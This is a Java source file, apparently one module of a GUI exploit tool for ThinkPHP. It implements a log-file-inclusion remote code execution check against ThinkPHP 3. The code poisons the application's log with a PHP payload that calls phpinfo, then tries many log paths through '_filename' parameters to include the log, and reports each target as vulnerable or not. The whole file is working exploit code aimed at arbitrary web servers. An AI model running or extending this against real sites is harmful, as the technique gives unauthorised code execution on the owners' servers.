package exploit;

import com.example.thinkphpgui.ConfigManager;
import com.example.thinkphpgui.Exploit;
import com.example.thinkphpgui.utils.HttpRequestUtil;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.stream.Stream;

public class Tp3_Log_Rce implements Exploit {
    private final ConfigManager configManager = ConfigManager.getInstance();
    private final List<String> logPathList = initLogPaths();
    private final List<String> paramPathList = Arrays.asList("?m=Home&c=Index&a=index&value[_filename]=.", "?m=Home&c=Index&a=index&info[_filename]=.", "?m=Home&c=Index&a=index&param[_filename]=.", "?m=Home&c=Index&a=index&name[_filename]=.", "?m=Home&c=Index&a=index&array[_filename]=.", "?m=Home&c=Index&a=index&arr[_filename]=.", "?m=Home&c=Index&a=index&list[_filename]=.", "?m=Home&c=Index&a=index&page[_filename]=.", "?m=Home&c=Index&a=index&menus[_filename]=.", "?m=Home&c=Index&a=index&var[_filename]=.", "?m=Home&c=Index&a=index&data[_filename]=.", "?m=Home&c=Index&a=index&module[_filename]=.");

    private final String payload = "?m=Home&c=Index&a=index&test=--><?=phpinfo()?>";


    private List<String> initLogPaths() {
        Date date = new Date();
        String year = String.format("%ty", date);
        String month = String.format("%tm", date);
        String day = String.format("%td", date);

        List<String> separators = Arrays.asList("-", "_", "/");
        List<String> directories = Arrays.asList("/Application/Runtime/Logs/Admin/", "/App/Runtime/Logs/Admin/", "/Application/Runtime/Logs/Home/", "/App/Runtime/Logs/Home/", "/Runtime/Logs/", "/App/Runtime/Logs/", "/Application/Runtime/Logs/App/", "/Application/Runtime/Logs/Ext/", "/Application/Runtime/Logs/Api/", "/Application/Runtime/Logs/Test/", "/Application/Runtime/Logs/Common/", "/Application/Runtime/Logs/Service/", "/Application/Runtime/Logs/", "/runtime/log/");

        List<String> pathList = new ArrayList<>();
        for (String dir : directories) {
            for (String separator : separators) {
                pathList.add(dir + year + separator + month + separator + day + ".log");
            }
        }
        return pathList;
    }

    private void verify(String url) throws IOException {
        // 先触发日志写入
        for (int i = 0; i < 2; i++) {
            try {
                HttpURLConnection httpURLConnection = HttpRequestUtil.get(url + payload);
                httpURLConnection.getResponseCode();
            } catch (Exception e) {
                       e.printStackTrace();
            }
        }
        for (String paramPath : paramPathList) {
            for (String logPath : logPathList) {
                String targetUrl = url + paramPath + logPath;
                try {
                    HttpURLConnection httpURLConnection = HttpRequestUtil.get(targetUrl);
                    BufferedReader bufferedReader;
                    if (httpURLConnection.getResponseCode() >= 400) {
                        bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getErrorStream()));
                    } else {
                        bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                    }

                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        if (Stream.of("PHP Version", "PHP Core", "PHP Variables", "PHP License").anyMatch(line::contains)) {
                            configManager.appendToTextArea("[+] " + url + "   存在Thinkphp 3 日志文件包含RCE：" + targetUrl);
                            return;
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        configManager.appendToTextArea("[-] " + url + "   不存在Thinkphp 3 日志文件包含RCE");

    }

    @Override
    public void startScan(String url) throws IOException {
        verify(url);
    }
}
